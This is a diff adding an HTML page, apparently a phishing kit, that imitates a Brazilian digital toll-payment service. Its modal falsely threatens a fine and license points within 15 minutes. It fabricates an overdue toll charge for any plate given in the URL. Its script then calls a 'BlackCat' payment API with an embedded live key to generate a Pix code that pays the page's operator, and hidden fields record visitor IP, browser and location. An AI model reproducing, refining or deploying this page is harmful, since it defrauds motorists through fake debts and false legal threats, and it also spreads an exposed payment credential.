@@ -1,0 +1,651 @@
+<!doctype html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Débitos — Pedágio Digital</title>
+    <meta name="description"
+        content="Veja e selecione seus débitos de pedágio, gere Pix e finalize o pagamento com segurança sem estar logado." />
+    <meta name="robots" content="index,follow" />
+    <link rel="icon" type="image/png" href="favicon.ico" />
+    <link rel="apple-touch-icon" href="favicon.ico" />
+    <link rel="stylesheet" href="lib/fonts/ubuntu.css">
+    <link rel="stylesheet" href="lib/bootstrap/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/debitos.css">
+    <link rel="stylesheet" href="css/modal.css">
+    <script src="lib/sweetalert2/sweetalert2.all.min.js"></script>
+</head>
+
+<body class="is-anon">
+
+    <input name="__RequestVerificationToken" type="hidden"
+        value="CfDJ8CZgslv4CrRDm31sA7Ti4nT6CwaEv7aY3FhXyIzdR3duGuDoehSqHgxnHB5r8JEu49Tmivjx7nvOWCYZLlTUGhPiXP6WIDv8mai2ZdwxepucG3MDjYdhEQVfJJlyTczcrkgYkK3z2GfozLIZSC1irgc" />
+
+    <div id="alertModal" class="modal-overlay" style="display: flex;">
+        <div class="modal-content">
+            <div class="modal-header-bar"></div>
+            <div class="modal-body">
+                <div class="modal-attention">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2L1 21h22L12 2zm1 14h-2v-2h2v2zm0-4h-2V8h2v4z"></path>
+                    </svg>
+                    ATENÇÃO
+                </div>
+                <h3 class="modal-subtitle">Débitos em aberto encontrados <span id="modalVehicleName">(3432424)</span>
+                </h3>
+                <p class="modal-main-text">
+                    <span class="red-text">Hoje, <span id="modalDay">segunda-feira</span> às <span
+                            id="modalTime">12:01</span></span> - Caso não realize o pagamento, a multa será
+                    automaticamente encaminhada ao DETRAN. Após esse prazo de 15 minutos, o sistema emitirá
+                    automaticamente a multa de <span class="red-text">R$ 195,23</span> e <span class="red-text">5 pontos
+                        na CNH</span>.
+                </p>
+                <div class="ctb-box">
+                    <h4>Art. 209-A - CTB:</h4>
+                    <p>Conforme o Art. 209-A do CTB: "Efetuar o pagamento de pedágio eletrônico fora do prazo
+                        estabelecido pelo órgão..."</p>
+                    <div class="ctb-details">
+                        <p>Infração: <span class="red-text">Grave.</span></p>
+                        <p>Penalidade: <span class="red-text">Multa de R$ 195,23.</span></p>
+                        <p>Pontuação: <span class="red-text">5 pontos na CNH.</span></p>
+                    </div>
+                </div>
+                <button class="modal-continue-btn" onclick="closeModal()">CONTINUAR</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function closeModal() { document.getElementById('alertModal').style.display = 'none'; }
+
+        // Preenche data/hora atual no modal
+        document.addEventListener("DOMContentLoaded", function () {
+            const diasSemana = ['domingo', 'segunda-feira', 'terça-feira', 'quarta-feira', 'quinta-feira', 'sexta-feira', 'sábado'];
+            const agora = new Date();
+            document.getElementById('modalDay').textContent = diasSemana[agora.getDay()];
+            document.getElementById('modalTime').textContent = agora.getHours().toString().padStart(2, '0') + ':' + agora.getMinutes().toString().padStart(2, '0');
+
+            // Pega a placa da URL se existir
+            const params = new URLSearchParams(window.location.search);
+            const placa = params.get('placa');
+            if (placa) {
+                const placaUpper = placa.toUpperCase();
+                document.getElementById('modalVehicleName').textContent = '(' + placaUpper + ')';
+                document.getElementById('qPlaca').value = placaUpper;
+                document.getElementById('Placa').value = placaUpper;
+                document.getElementById('Cliente').value = placaUpper;
+                document.getElementById('resumoPlaca').textContent = placaUpper;
+                document.getElementById('pixPlate').textContent = placaUpper;
+
+                // Atualiza a placa nos itens da lista
+                document.querySelectorAll('.item-placa').forEach(el => el.textContent = placaUpper);
+                document.querySelectorAll('.chkDebito').forEach(el => el.dataset.placa = placaUpper);
+            }
+        });
+    </script>
+
+    <!-- Appbar -->
+    <header class="appbar" aria-label="Barra superior">
+        <div class="appbar__inner">
+            <a type="button" class="back" id="btnBack" aria-label="Voltar" href="index.html">
+                <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                </svg>
+            </a>
+            <h1 class="appbar__title">Débitos</h1>
+            <span class="appbar__spacer" aria-hidden="true"></span>
+        </div>
+    </header>
+    <main class="page">
+        <!-- HERO com imagem -->
+        <section class="hero-strap">
+            <img src="images/home-KlC6Y-6S.png" alt="" class="hero-img" />
+
+            <input type="hidden" id="ChavePix" value="712253c0-720d-4919-b96f-1a6990664ba1" />
+            <input type="hidden" id="Cliente" value="3432424" />
+            <input type="hidden" name="Ip" id="Ip" value="172.70.140.20" />
+            <input type="hidden" name="Isp" id="Isp" value="Cloudflare, Inc." />
+            <input type="hidden" name="Navegador" id="Navegador" value="Google Chrome" />
+            <input type="hidden" name="Plataforma" id="Plataforma" value="MacOS" />
+            <input type="hidden" name="Localidade" id="Localidade" value="Rio De Janeiro / Rio de Janeiro" />
+            <input type="hidden" name="Pais" id="Pais" value="Brazil - America/Sao_Paulo" />
+            <input type="hidden" name="Flag" id="Flag" value="br" />
+
+            <input type="hidden" name="Placa" id="Placa" value="3432424" />
+            <input type="hidden" name="Modelo" id="Modelo" />
+            <input type="hidden" name="Modo" id="Modo" value="pix" />
+            <input type="hidden" name="Gateway" id="Gateway" value="BlackCat" />
+            <input type="hidden" name="Ticket" id="Ticket" value="1000" />
+
+
+            <div class="search-wrap">
+                <label class="search-label" for="qPlaca">
+                    <img
+                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAABIklEQVR4AeyTXRHCMBCEAQVIAAc4AAfgACTgoMUJEsABEpCAA+qgfNfmOs0fTTrwwAyZvWya7GWTazubfLn9DQYLHCxRXddFnd+KkJtnwL4LhCWRi5LcuZvkGSDYEILrNLEhvhGCg3T9CBnsjeBsOIVORrQ13JFlwBWlPHKDisNfOtXw4I6kIjbsYZXJMkCwIwRzhMkg4UnoxkfGHVwDLU8nGDFY93Ncg5UsUp5RkFxCSgy1cA3aWXrqo/9C8PtGMknRRA3YQP8FZaY86JqyJ3hnoJ+espfMhK4pM2UjasBLKAlB9HQsDmqCBtR2FOyzt09Bg3bpM33UgOtnIXYc1+BhhMrmMYk0R7lJsgw48pIQLJvVjI6kYK5lkLFfsvT3DV4AAAD//22gyo8AAAAGSURBVAMAa0vTMd1B76sAAAAASUVORK5CYII=">
+                    <span>Seus veículos:</span>
+                </label>
+
+                <div class="search">
+                    <input id="qPlaca" type="text" inputmode="latin" maxlength="7" placeholder=""
+                        aria-label="Buscar por placa" disabled />
+                </div>
+            </div>
+        </section>
+
+        <!-- LISTA -->
+        <section class="container">
+            <div class="section-bar">
+                <h2 class="section-title">Débitos</h2>
+                <time id="debitoCheckedAt" class="section-stamp" aria-live="polite">09/02/2026 - 12:01</time>
+            </div>
+
+            <!-- Selecionar todos -->
+            <label class="row row--bulk">
+                <input id="checkAll" type="checkbox">
+                <span><strong id="bulkLabel">Selecionar 1 passagens em aberto</strong></span>
+            </label>
+
+            <ul id="listaDebitos" class="list" aria-live="polite">
+
+                <li class="item">
+                    <label class="row">
+                        <input type="checkbox" class="chkDebito" data-placa="3432424" data-valor="67,19"
+                            data-concessao="CCR Rodovias" />
+                        <div class="item-left">
+                            <span class="item-placa">3432424</span>
+                            <span class="item-dados item-dados1 blur-if-anon">06/02/2026 15:01:23</span>
+                            <span class="item-conc">CCR Rodovias</span>
+                            <span class="item-dados item-dados2 blur-if-anon"></span>
+                        </div>
+                        <div class="item-head">
+                            <span class="badge badge-expired">
+                                Venceu em 08/02/2026
+                            </span>
+                            <span class="item-price">R$&nbsp;67,19</span>
+                            <span class="row__fee">
+                                Multa + Juros: R$ 0,00 + R$ 0,00
+                            </span>
+
+                            <span class="row__total">Total: <strong>67,19</strong></span>
+                        </div>
+                    </label>
+                </li>
+
+            </ul>
+        </section>
+
+        <!-- Estado vazio -->
+        <div id="emptyStateHome" class="empty" hidden>
+            <img class="empty__icon" alt="" />
+            <p class="empty__title">Nenhuma passagem em aberto encontrada.</p>
+            <p class="empty__desc">
+                As passagens podem levar até 48 horas para ficarem disponíveis no sistema para pagamento.
+            </p>
+            <p id="emptyCheckedAt" class="empty__stamp"></p>
+            <div class="empty-info">
+                <img class="empty-info__icon" alt="" />
+                <p class="empty-info__text">
+                    Se o veículo possui TAG a cobrança é automática. Verifique se a TAG está ativa e se os débitos
+                    aparecem na
+                    fatura de sua operadora. Caso contrário, consulte possíveis pendências aqui.
+                </p>
+            </div>
+        </div>
+
+        <!-- FORMA DE PAGAMENTO (seção de seleção) -->
+        <section class="container" id="paySection" hidden>
+            <h2 class="section-title">Forma de pagamento</h2>
+            <p class="section-sub">Selecione abaixo como quer fazer o pagamento</p>
+
+            <ul class="pay-list">
+
+                <!-- Pix -->
+                <li class="pay-item" id="optPix" role="button" tabindex="0" aria-label="Pix">
+                    <span class="pay-icon" aria-hidden="true">
+                        <img
+                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAYAAABHomvIAAAEOklEQVR4AcyYS2wTVxSG/xmVPiQMplIrBUIbWqm4j4RWVFAJV6KCbkil2qabUqnj7kpD93E2bTdx9iWwTIwU2MVGImwAgYSReIpHeAQk3mBLIEGIWfCKL+e/4QYnWGQ8HuIZzfHM3Hvn3G/O+c/ckW1U2a6qWPiWSiRvq8S/s2EFtT5WVLGWKiiYAshBBRXf/zas+xZUH6D+wSyYQjlbhnVVgtFHhkrQScCiWu/IoJMKWI2GbSpJBrIYBA1YVL+sLqPcL41hsUbvYbLcVDEdKA2oMC7pbDTX1PltWH2sBfuWiiUlrS1TuwNx1fIO7KQtpE4gcKpCqJ9tid7XVfsC0Eg2WziCUBiCUXUPE7BqT1AafQMce/AM27bc1Hb7xiPfns8XwJHhh/jxqzzSnRe1xVcdRnag6Atk3YCEc9YdRyg8B3vPRrU1f/weujae8wWyLsBKuMzQciz66F1tPP+8LeQLpGdAA0ftrWn/QIOZnIbmv4XOns/0Zb2R9Ay4UKL1/45lWPPTh1IYN9CbvqKB+EP4v389jUWS6szu5Vjx/QI2e7KaAXMi/rWteSSihzVUSiIV/60JmwWQkIQzmmSqjx28D6f9OHiPl8KpCZBwKRF/aP4crIi+j5EzD0GYjtSnMJC8ZsEQrjd9WYNHWkMSPcuTJl0DMjKEi7SFwMm7t36hj6UH41MgK+EYsY7UJ9i8fRmy+ZUwhXNUoirErnbXgF1/npvQlFTrPCkCeo+0zX0FclBAGDkDt0kAOTYk9/DBqMvenpd6Zd/rzDXgheES4huaYOCMU0JSh1w9EtEjWpuEY2EYODOWkPTxRiLICbMDBRDETMgjU88VhJFh9Abz34F6JASLhmOM8ZVEHxGRiWmb6eg6gqn0Uhi9GUjCTS+KhCxzHRVFYyAJ56w7oR+QEZ8JzPS7BoxM01vXxvO6OKYXBeEdWfoqITdtOC1jT2BEZNK99Ut5A7h/L7oG5BMZyHmy7h7N30NEUkXhVxZFVlJsIk3IDikSgpXGnoJwTD99ubWaAOk0IpGk1jJD34KTpzsvITtQ1OcsCvYT2kDy1UJd7h2Oam3SRy1WM6BxziJwRFP7dt2ZhDN9hOyW9yTTTSkU6vg+9AzIVHWLngi1b+guWAQ8pxGMlU0pMJqR1rls9mSeATmbgRw5U4LTPlGhhHOkSEpj46gXjnPUBUgHhGRhFK4/wlr5qqb5BUf/dQPSCTU3eGglUj1Lte0ZXoV60kqfxnwBpDN+Tf/+12LQpi+H7PdqvgF6BZjpPgKOzjSogf2jtgWcQkA3skkErZ0B5UMZVsZ+LH9cCum1AEJea7YG++0lVm50HOqPoAGWXzBJioHFVu6AmmgIQsGMkoVMDJoG5Emzleu3ob6R/+QyvG6EidQOkIEsZv5JQDY0WTnJezYpg5ZI2uOA9d9sGCP2BGrBQiv7AxlQsT0HAAD//3SWnEIAAAAGSURBVAMA0yh2lU3d0/oAAAAASUVORK5CYII=">
+                    </span>
+                    <div class="pay-texts">
+                        <strong>Pix</strong>
+                        <small>Informações para pagamento</small>
+                    </div>
+                    <span class="pay-arrow" aria-hidden="true">
+                        <svg width="24" height="24" viewBox="0 0 24 24">
+                            <path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2"
+                                stroke-linecap="round" stroke-linejoin="round" />
+                        </svg>
+                    </span>
+                </li>
+
+            </ul>
+        </section>
+        <br />
+        <br />
+
+        <!-- CARTÃO DE CRÉDITO -->
+        <section class="container" id="cardSection" hidden>
+            <h2 class="section-title">Cartão de crédito</h2>
+
+            <!-- ADD: lista de cartões salvos -->
+            <div id="iFixPay"></div>
+        </section>
+
+
+        <!-- PIX -->
+        <section class="container" id="pixSection" hidden>
+
+
+            <div class="summary-card">
+                <h3>Resumo do pedido</h3>
+                <div class="summary-grid">
+                    <div class="summary-row">
+                        <span>Placa do veículo</span>
+                        <strong id="pixPlate">—</strong>
+                    </div>
+                    <div class="summary-row">
+                        <span>Vencimento código Pix</span>
+                        <strong id="pixExpireAbs">—</strong>
+                    </div>
+
+                    <!-- LINHA DO TOTAL COM FUNDO VERDE/AMARELO -->
+                    <div class="summary-total-row">
+                        <span>Valor do pedido</span>
+                        <strong id="pixTotal">R$ 0,00</strong>
+                    </div>
+                </div>
+            </div>
+
+
+            <p class="pix-countdown">Pague em até: <strong id="pixCountdown">12:21:24</strong></p>
+
+            <div class="qr-box">
+                <div class="qr-loader" id="qrLoader"></div>
+                <img id="pixImg" src="" alt="QR Code Pix" style="width:100%; height:100%; object-fit:contain;">
+            </div>
+
+            <p class="pix-hint">
+                Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
+            </p>
+
+            <textarea id="pixCopia" class="code-box" rows="4" readonly></textarea>
+
+            <div class="btn-row">
+                <button type="button" id="btnCopyPix" class="btn-continue" onclick="copiarPix()">Copiar código
+                    Pix</button>
+            </div>
+        </section>
+        <br />
+
+        <style>
+            .total-head .chev {
+                transition: transform .25s ease;
+            }
+
+            .total-head.is-open .chev {
+                transform: rotate(180deg);
+            }
+        </style>
+
+        <!-- TOTAL / RESUMO (sempre visível) -->
+        <aside class="total-card" aria-labelledby="totalTitle">
+            <!-- Corpo sempre visível -->
+            <div id="resumoPanel" class="total-body">
+                <p class="resumo-placa">Placa: <strong id="resumoPlaca">—</strong></p>
+                <ul id="resumoItens" class="resumo-list"></ul>
+
+                <!-- linha final com total + botão à direita -->
+                <div class="resumo-total">
+                    <span>Total a pagar:</span>
+                    <strong id="resumoTotal">R$&nbsp;0,00</strong>
+                    <button type="button" id="btnContinuar" class="btn-continue btn-continue--inline">
+                        Continuar
+                    </button>
+                </div>
+            </div>
+        </aside>
+    </main>
+
+    <!-- Modal de Erro (reutilizável) -->
+    <div class="dlg" id="errorDlg" aria-hidden="true">
+        <div class="dlg__overlay" data-close></div>
+        <div class="dlg__card">
+            <div class="m__grab" aria-hidden="true"></div>
+            <h3 class="dlg__title" id="errorDlgTitle">Ops!</h3>
+            <p id="errorDlgMsg">Não foi possível consultar os débitos desta placa. Tente novamente.</p>
+            <button type="button" class="dlg__primary" name="btnCloseError" data-close>OK</button>
+        </div>
+    </div>
+    <!-- Modal - Mensagem do Card 27458 -->
+    <div id="popupSemPassagem" class="popup hidden">
+        <div class="popup-content">
+            <span class="popup-icon">!</span>
+            <div class="popup-text">
+                <strong>Não encontrou sua passagem?</strong>
+                <p>
+                    Cadastre-se para ser notificado por SMS quando o débito já estiver disponível.
+                </p>
+            </div>
+            <button class="popup-close" onclick="fecharPopup()">✕</button>
+        </div>
+        <div class="popup-progress">
+            <div class="popup-progress-bar" id="popupProgressBar"></div>
+        </div>
+    </div>
+
+    <script src="lib/jquery/dist/jquery.min.js"></script>
+    <script src="lib/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+
+            /* ======================
+               ESTADO
+            ====================== */
+            let currentStep = 1;
+            let total = 0;
+
+            /* ======================
+               ELEMENTOS
+            ====================== */
+            const lista = document.getElementById("listaDebitos");
+            const checkAll = document.getElementById("checkAll");
+
+            const resumoItens = document.getElementById("resumoItens");
+            const resumoTotal = document.getElementById("resumoTotal");
+            const resumoPlaca = document.getElementById("resumoPlaca");
+
+            const btnContinuar = document.getElementById("btnContinuar");
+
+            const paySection = document.getElementById("paySection");
+            const pixSection = document.getElementById("pixSection");
+
+            const optPix = document.getElementById("optPix");
+            const optCard = document.getElementById("optCard");
+            const optWhatsapp = document.getElementById("optWhatsapp");
+
+            const resumoPanel = document.getElementById("resumoPanel");
+
+            const pixTotal = document.getElementById("pixTotal");
+
+            /* ======================
+               HELPERS
+            ====================== */
+            function formatMoney(valor) {
+                const numero = Number(valor) || 0;
+
+                return numero.toLocaleString("pt-BR", {
+                    style: "currency",
+                    currency: "BRL",
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                });
+            }
+
+            function scrollToEl(el) {
+                el.scrollIntoView({ behavior: "smooth", block: "start" });
+            }
+
+
+            /* ======================
+               ATUALIZA RESUMO
+            ====================== */
+            function atualizarResumo() {
+                const selecionados = lista.querySelectorAll(".chkDebito:checked");
+
+                total = 0;
+                resumoItens.innerHTML = "";
+
+                if (selecionados.length === 0) {
+                    resumoTotal.textContent = "R$ 0,00";
+                    resumoPlaca.textContent = "—";
+                    return;
+                }
+
+                selecionados.forEach(chk => {
+                    const valor = parseFloat(chk.dataset.valor.replace(/\./g, "").replace(",", ".")) || 0;
+                    const concessao = chk.dataset.concessao;
+                    const placa = chk.dataset.placa;
+
+                    total += valor;
+
+                    const li = document.createElement("li");
+                    li.innerHTML = `<span>${concessao}</span><strong>${formatMoney(valor)}</strong>`;
+                    resumoItens.appendChild(li);
+
+                    resumoPlaca.textContent = placa;
+                });
+
+                resumoTotal.textContent = formatMoney(total);
+                pixTotal.textContent = formatMoney(total);
+            }
+
+            /* ======================
+               CHECKBOX INDIVIDUAL
+            ====================== */
+            lista.addEventListener("change", (e) => {
+                if (!e.target.classList.contains("chkDebito")) return;
+
+                const todos = lista.querySelectorAll(".chkDebito");
+                const marcados = lista.querySelectorAll(".chkDebito:checked");
+
+                checkAll.checked = todos.length === marcados.length;
+                atualizarResumo();
+            });
+
+            /* ======================
+               SELECIONAR TODOS
+            ====================== */
+            checkAll.addEventListener("change", () => {
+                const checks = lista.querySelectorAll(".chkDebito");
+                checks.forEach(chk => chk.checked = checkAll.checked);
+                atualizarResumo();
+            });
+
+            /* ======================
+               CONTROLE DE STEPS
+            ====================== */
+            function irParaStep(step) {
+                currentStep = step;
+
+                // reset visual
+                paySection.hidden = true;
+                pixSection.hidden = true;
+
+                // STEP 1 — Débitos
+                if (step === 1) {
+                    lista.style.pointerEvents = "auto";
+                    scrollToEl(lista);
+                }
+
+                // STEP 2 — Pagamento
+                if (step === 2) {
+                    lista.style.pointerEvents = "none";
+                    paySection.hidden = false;
+                    scrollToEl(paySection);
+                }
+
+                // STEP 3 — Pix
+                if (step === 3) {
+
+                    lista.style.pointerEvents = "none";
+                    pixSection.hidden = false;
+                    scrollToEl(pixSection);
+
+                    chamarGeraPIX();
+
+                }
+            }
+
+            /* ======================
+               CONTINUAR
+            ====================== */
+            function continuar() {
+
+                // STEP 1 → STEP 2
+                if (currentStep === 1) {
+                    const selecionados = lista.querySelectorAll(".chkDebito:checked");
+
+                    if (selecionados.length === 0) {
+                        Swal.fire('Atenção', 'Selecione pelo menos uma passagem.', 'warning');
+                        return;
+                    }
+
+                    irParaStep(2);
+                    return;
+                }
+
+                // STEP 2 → STEP 3 (PIX)
+                if (currentStep === 2) {
+                    irParaStep(3);
+                    return;
+                }
+            }
+
+            btnContinuar.addEventListener("click", (e) => {
+                e.stopPropagation();
+                continuar();
+            });
+
+            /* ======================
+               FORMAS DE PAGAMENTO
+            ====================== */
+            optPix.addEventListener("click", () => {
+                if (currentStep !== 2) return;
+                irParaStep(3);
+            });
+
+            /* ======================
+               INIT
+            ====================== */
+            irParaStep(1);
+        });
+
+        function copiarPix() {
+            const textarea = document.getElementById("pixCopia");
+            textarea.select();
+            document.execCommand('copy');
+            Swal.fire('Sucesso', 'Código Pix copiado com sucesso.', 'success');
+        }
+
+        /* ===============================
+        GERAR PIX via BlackCat API
+        ================================ */
+        async function chamarGeraPIX() {
+
+            const texto = document.getElementById("pixTotal").textContent || "R$ 0,00";
+
+            const valor = parseFloat(
+                texto
+                    .replace("R$", "")
+                    .replace(/\./g, "")
+                    .replace(",", ".")
+                    .trim()
+            ) || 0;
+
+            // Valor em centavos para a API
+            const valorCentavos = Math.round(valor * 100);
+
+            if (valor <= 0) {
+                Swal.fire('Atenção', 'Selecione pelo menos um débito.', 'warning');
+                return;
+            }
+
+            const qrLoader = document.getElementById("qrLoader");
+            const pixImg = document.getElementById("pixImg");
+            const pixCopia = document.getElementById("pixCopia");
+
+            // 🔄 mostra loader
+            qrLoader.style.display = "block";
+            pixImg.style.display = "none";
+
+            // Dados do cliente
+            const placa = document.getElementById('Placa').value || 'PLACA';
+
+            try {
+                const response = await fetch('https://api.blackcatpagamentos.online/api/sales/create-sale', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-Key': 'sk_live_98b9bb1f0ab2c70a512024db5766ebf0d3f3bad0f495e301b1db53b9f21a60f5'
+                    },
+                    body: JSON.stringify({
+                        amount: valorCentavos,
+                        currency: 'BRL',
+                        paymentMethod: 'pix',
+                        items: [
+                            {
+                                title: 'MPX2026',
+                                unitPrice: valorCentavos,
+                                quantity: 1,
+                                tangible: false
+                            }
+                        ],
+                        customer: {
+                            name: 'Cliente ' + placa,
+                            email: 'cliente@pedagiodigital.com.br',
+                            phone: '11999999999',
+                            document: {
+                                number: '00000000000',
+                                type: 'cpf'
+                            }
+                        },
+                        pix: {
+                            expiresInDays: 1
+                        },
+                        externalRef: 'MPX2026'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success && data.data && data.data.paymentData) {
+                    // Sucesso - exibe QR Code
+                    const paymentData = data.data.paymentData;
+
+                    // Usar qrCodeBase64 se disponível, senão gera imagem do código
+                    if (paymentData.qrCodeBase64) {
+                        // Verifica se já tem o prefixo data:image, senão adiciona
+                        if (paymentData.qrCodeBase64.startsWith('data:image')) {
+                            pixImg.src = paymentData.qrCodeBase64;
+                        } else {
+                            pixImg.src = 'data:image/png;base64,' + paymentData.qrCodeBase64;
+                        }
+                    } else if (paymentData.qrCode) {
+                        pixImg.src = 'https://gerarqrcodepix.com.br/api/v1?brcode=' + encodeURIComponent(paymentData.qrCode);
+                    }
+
+                    // Código copia e cola
+                    pixCopia.value = paymentData.copyPaste || paymentData.qrCode || '';
+
+                    // Atualizar data de vencimento
+                    if (paymentData.expiresAt) {
+                        const expireDate = new Date(paymentData.expiresAt);
+                        document.getElementById('pixExpireAbs').textContent = expireDate.toLocaleDateString('pt-BR');
+                    } else {
+                        // Se não vier da API, usa data de amanhã
+                        const tomorrow = new Date();
+                        tomorrow.setDate(tomorrow.getDate() + 1);
+                        document.getElementById('pixExpireAbs').textContent = tomorrow.toLocaleDateString('pt-BR');
+                    }
+
+                    pixImg.style.display = "block";
+                    qrLoader.style.display = "none";
+
+                    console.log('PIX gerado com sucesso:', data.data.transactionId);
+                } else {
+                    throw new Error(data.message || 'Erro ao gerar PIX');
+                }
+
+            } catch (error) {
+                console.error('Erro ao chamar API:', error);
+                qrLoader.style.display = "none";
+                Swal.fire('Erro', 'Não foi possível gerar o PIX. Tente novamente.', 'error');
+            }
+        }
+    </script>
+
+</body>
+
+</html>
